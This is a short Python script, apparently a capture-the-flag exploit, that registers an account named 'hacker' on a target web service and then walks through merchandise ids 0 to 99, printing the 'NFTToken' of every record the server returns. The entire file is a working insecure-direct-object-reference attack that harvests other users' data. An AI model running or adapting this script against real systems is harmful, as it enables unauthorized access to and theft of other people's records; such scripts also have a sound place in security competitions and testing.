import requests
import sys

HOST = sys.argv[1]
PORT = '8080'
hint = sys.argv[2]
URL = f'http://{HOST}:{PORT}'

with requests.Session() as s:
    user = {"username" : "hacker", "password" : "hacker_password"}
    s.post(f'{URL}/api/v1/register', json=user)
    s.post(f'{URL}/api/v1/login', json=user)
    for i in range(100):
        resp = s.get(f'{URL}/api/v1/my_merchandise?id={i}')
        if resp.status_code == 200:
            print(resp.json()["NFTToken"])